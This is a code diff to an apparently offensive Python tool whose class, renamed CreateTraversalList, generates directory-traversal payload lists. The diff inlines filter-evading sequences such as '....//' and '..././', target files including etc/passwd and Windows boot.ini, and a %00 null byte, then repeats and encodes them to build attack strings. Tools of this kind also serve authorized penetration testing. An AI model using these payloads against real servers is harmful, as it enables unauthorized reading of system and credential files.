@@ -1,7 +1,7 @@
-from . import tools, utils
+from . import utils
 
 
-class ConjureTraversalList:
+class CreateTraversalList:
     def __init__(
             self,
             custom_payload: list = None,
@@ -30,11 +30,28 @@ class ConjureTraversalList:
         self.traversal_list_length = len(self.traversal_list)
 
     def create(self) -> list:
-        directives = [f"{directive * i}" for i in range(2, self.repeat) for directive in tools.directives]
+        directives = [
+            '....//',
+            '...\/',
+            '....////',
+            '..././',
+        ]
+
+        payloads = [
+            'etc/passwd',
+            'etc/hosts',
+            'Windows\\boot.ini'
+        ]
+
+        null_bytes = [
+            "%00"
+        ]
+
+        directives = [f"{directive * i}" for i in range(2, self.repeat) for directive in directives]
         self._update(traversal_list=directives)
 
         if self.default_payload:
-            default_payload_included = utils.add_payload(traversal_list=directives, payloads=tools.payloads)
+            default_payload_included = utils.add_payload(traversal_list=directives, payloads=payloads)
             self._update(traversal_list=default_payload_included)
 
         if self.custom_payload:
@@ -50,7 +67,7 @@ class ConjureTraversalList:
             self._update(traversal_list=url_encoded_included)
 
         if self.null_bytes:
-            null_bytes_included = utils.add_null_bytes(traversal_list=self.traversal_list, null_bytes=tools.null_bytes)
+            null_bytes_included = utils.add_null_bytes(traversal_list=self.traversal_list, null_bytes=null_bytes)
             self._update(traversal_list=null_bytes_included)
 
         return self.traversal_list
